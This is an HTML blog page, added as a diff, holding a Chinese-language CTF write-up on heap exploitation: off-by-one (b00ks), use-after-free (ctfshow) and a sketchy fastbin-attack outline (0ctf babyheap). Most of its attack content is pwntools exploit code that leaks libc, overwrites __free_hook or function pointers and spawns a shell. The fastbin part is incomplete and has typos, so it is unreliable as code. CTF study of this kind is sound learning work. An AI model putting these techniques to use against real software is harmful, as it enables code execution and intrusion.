@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="泄露libc之后可以进行的攻击，修改__malloc_hook,__free_hook为onegadget，不泄露libc可以改写free或者malloc的got表为system，不过，要自己控制参数1.off-by-one例题:1.Asis CTF 2016 b00ks虽然exp思路很清晰，但是很多地方都是通过大量的调试得出来的 book的结构 123456struct book&amp;#123;	i">
+<meta property="og:type" content="website">
+<meta property="og:title" content="堆的漏洞利用">
+<meta property="og:url" content="http://example.com/drafts/%E5%A0%86%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html">
+<meta property="og:site_name" content="Archerの博客">
+<meta property="og:description" content="泄露libc之后可以进行的攻击，修改__malloc_hook,__free_hook为onegadget，不泄露libc可以改写free或者malloc的got表为system，不过，要自己控制参数1.off-by-one例题:1.Asis CTF 2016 b00ks虽然exp思路很清晰，但是很多地方都是通过大量的调试得出来的 book的结构 123456struct book&amp;#123;	i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/drafts/images/books_location.png">
+<meta property="og:image" content="http://example.com/drafts/images/QQ%E6%88%AA%E5%9B%BE20210511112608">
+<meta property="article:published_time" content="2021-05-06T09:04:00.000Z">
+<meta property="article:modified_time" content="2021-05-25T08:53:25.685Z">
+<meta property="article:author" content="Archer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/drafts/images/books_location.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>堆的漏洞利用 | Archerの博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archerの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录一个菜鸡的成长之路</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-about"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-categories"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archives"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h1 class="post-title" itemprop="name headline">堆的漏洞利用</h1>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>泄露libc之后可以进行的攻击，修改__malloc_hook,__free_hook为onegadget，不泄露libc可以改写free或者malloc的got表为system，不过，要自己控制参数<br>1.off-by-one<br>例题:<br>1.Asis CTF 2016 b00ks<br>虽然exp思路很清晰，但是很多地方都是通过大量的调试得出来的</p>
+<p>book的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">char</span> *description;</span><br><span class="line">	<span class="keyword">char</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过find ‘a’*32可以查看输入的name的位置，以及第一个books的位置<br><img src="images/books_location.png" alt="avatar"><br>book的地址为：0x563c674ce150<br>name后面紧接着就是指向book的指针，这代表可以将0x563c674ce150改为0x563c674ce100， 接下来该怎么做？此时仔细想一下程序的功能，创建book，查看book，删除book，修改book的des(通过desp那个指针)，此时不难想到，如果des是我们控制的地址就能实现任意地址读写，那怎么控制des的地址呢–&gt;<br>1.一个book在另一个book的des范围内(实现不了)<br>2.伪造一个book，再将已有的book的地址，改为伪造的book的地址(可行)</p>
+<p>第一个book的内容<br>![avatar](images/屏幕截图 2021-05-10 222431.png)<br>此时第一个book中的des指针为：0x0000563c674ce040<br>第二步的具体操作是修改第一个book的内容为’a’*0xC0+p64(addr)*2+p64(0xffff)<br>addr填上想泄露的地址，但是这个题开了pie，任意地址读写发挥不了作用，这时就需要一个小知识点了，mmap分配的内存于libc_base之间存在固定的偏移<br>在本题中可以通过控制book的name以及des的大小从而使用mmap分配内存，这样就能得到了libc_base，这时就需要再创建一个book了，size可以为0x21000,然后就可以通过gdb将第一个book于第二个book的偏移量算出来，然后addr填上name的地址(addr+0x38)，就能够得到libc_base<br>offest的计算见下图(是第一个使用mmap分配得到的内存地址)<br><img src="images/QQ%E6%88%AA%E5%9B%BE20210511112608" alt="avatar"><br>offest = 0x00007f717c7eb010 - 0x00007f717c239000 = 0x5b2010<br>libc_base = 0x00007f717c7eb010 - offest<br>然后就可以得到one_gadget的地址，以及__free_hook的地址，此时通过任意地址写，即能get_shell<br>漏洞点：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;<span class="comment">//程序最多输入32个字符，但是这里又在结尾加了一个\x00字符</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creatbook</span>(<span class="params">size1,name,size2,description</span>):</span></span><br><span class="line"></span><br><span class="line">	p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">	p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size2))</span><br><span class="line">	p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delbooks</span>(<span class="params">bookid</span>):</span></span><br><span class="line"></span><br><span class="line">	p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(bookid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbooks</span>(<span class="params">index , des</span>):</span></span><br><span class="line"></span><br><span class="line">	p.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	p.readuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeauthor</span>(<span class="params">name</span>):</span></span><br><span class="line"></span><br><span class="line">	p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span>():</span></span><br><span class="line"></span><br><span class="line">    p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span>():</span></span><br><span class="line"></span><br><span class="line">     p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">     log.info(p.recvuntil(<span class="string">&quot;:&quot;</span>))</span><br><span class="line">     p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">creatbook(<span class="number">16</span>,<span class="string">&quot;archer&quot;</span>,<span class="number">256</span>,<span class="string">&quot;archer&quot;</span>)</span><br><span class="line">creatbook(<span class="number">0x21000</span>,<span class="string">&quot;archer&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;archer&quot;</span>)</span><br><span class="line"></span><br><span class="line">printbook()</span><br><span class="line">a=p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">offest=<span class="number">0x5b2010</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xC0</span>+p64(<span class="number">0x1</span>)+p64(addr+<span class="number">0x38</span>)+p64(addr+<span class="number">0x40</span>)+p64(<span class="number">0xffff</span>)</span><br><span class="line">editbooks(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">changeauthor(<span class="string">&quot;b&quot;</span>*<span class="number">32</span>)</span><br><span class="line">printbook()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">book2_name=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">book2_des=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;book2_name: &quot;</span>+<span class="built_in">hex</span>(book2_name))</span><br><span class="line">log.info(<span class="string">&quot;book2_des: &quot;</span>+<span class="built_in">hex</span>(book2_des))</span><br><span class="line"></span><br><span class="line">libc_base=book2_name-offest</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line">one_addr=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.info(<span class="string">&quot;one_gadget: &quot;</span>+<span class="built_in">hex</span>(one_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(free_hook) * <span class="number">2</span></span><br><span class="line">editbooks(<span class="number">1</span>, payload)</span><br><span class="line">payload=p64(one_addr)</span><br><span class="line">editbooks(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">release()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2.uaf<br>和off-by-one相比，uaf是真的简单<br>预备知识:<br>    在fastbin中chunk是通过链表单向连接，且chunk中的pre_in_use位都为1，当释放一个chunk(free,且&lt;64B)后，该chunk会放在链表的首位<br>    假设存在chunk1，和chunk2，先释放chunk1，再释放chunk2，在申请和chunk1、2一样大小的内存，这时得到的是chunk2，再申请一个，这是得到的就是chunk1了<br>漏洞原理：当一个chunk被free掉后，如果没将对应的内容设为NULL，这时，再次使用它就可以使用它的数据，有的情况，就可以通过这种方式，进行攻击<br>例题:ctfshow大牛杯uaf</p>
+<p>note的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	ptr* put_content;<span class="comment">//存放的时put(addr)的地址</span></span><br><span class="line">	ptr* <span class="built_in">free</span>;<span class="comment">//存放的是free(addr)的地址</span></span><br><span class="line">	ptr* content;<span class="comment">//存放的是content的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>功能：<br>    1、addnote：<br>        分配12个字节的内存用于存放note，ptr_content存放Value(当选择输入的内容是字符时，需要先输入size，然后malloc(size))<br>    2、delnote<br>        通过调用ptr* free将note释放掉,ptr* put_content的地址是free()的参数，后面能用到<br>    3、shownote<br>        通过调用ptr* put_content打印content中的内容</p>
+<p>利用流程:先创建两个note，note0，和note1，然后再依次释放这两个note,再创建一个note2，分配12B的content，此时content对应的就是note0，然后就可以控制note0中的内容，put_content-&gt;’sh\x00\x00’,free(sys_addr),之后再del(0),就能得到shell了<br>补充：该程序分配完一个note之后，再分配的note为该note+1，即使释放之后<br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28072</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newrecord</span>(<span class="params">index,length,content</span>):</span></span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Act &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Index &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Type &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Length &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Value &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delrecord</span>(<span class="params">index</span>):</span></span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Act &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	log.info(p.recvuntil(<span class="string">&#x27;Index &gt; &#x27;</span>))</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showrecord</span>(<span class="params">index</span>):</span></span><br><span class="line">	<span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;Act &gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;Index &gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x080484F0</span></span><br><span class="line"></span><br><span class="line">newrecord(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">newrecord(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delrecord(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">delrecord(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">newrecord(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+p32(sys_addr))</span><br><span class="line"></span><br><span class="line">delrecord(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>3.fastbin attack<br>例题1<br>0ctf_babyheap<br>预备知识：当一个小于64B的bytes被释放后，会被放在fastbin中，通过单向链表连接，fastbin中的pre_in_use位始终为1。一个small chunk被释放后，会先进入unsort bin中，如果此时unsorted bin中只有一个bin，那么其fd指针会指向main_arena,main_arena与libc_base存在固定偏移，该偏移可以通过libc文件中的malloc_trim得到<br>流程：先通过fastbin attack泄露libc_base, 然后再依次通过fastbin attck改写malloc_hook指针对应的内容位one_gadget<br>本题中的fastbin attack基于堆溢出<br>第一部分fastbin attack：<br>malloc(0x10)#chunk 0<br>malloc(0x10)#chunk 1<br>malloc(0x10)#chunk 2<br>malloc(0x10)#chunk 3<br>malloc(0x80)#chunk 4</p>
+<p>free(1)<br>free(2)#此时fd指针指向chunk1为0x20</p>
+<p>payload=p64(0)*3+p64(0x21)#覆盖1<br>payload+=p64(0)*3+p64(0x21)#覆盖2<br>payload+=p8(0x80)</p>
+<p>fill(0,payload)</p>
+<p>payload=p64(0)*3+p64(0x21)<br>fill(3,payload)</p>
+<p>malloc(0x10)<br>malloc(0x10)</p>
+<p>payload=p64(0)*3+p64(0x91)<br>fill(3,payload)</p>
+<p>malloc(0x80)#防止chunk 4与top chunk连接<br>free(4)</p>
+<p>dump(2)<br>libc_addr=u64(p.recv(6).just(8,’\x00’))</p>
+<p>第二部分<br>malloc(0x60)#将small chunk中的chunk放入fastbin中<br>free(4)<br>payload=libc_addr+offest<br>fill(2,payload)<br>malloc(0x60)<br>malloc(0x60)<br>fill(6,payload)<br>p.interactive()</p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Archer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
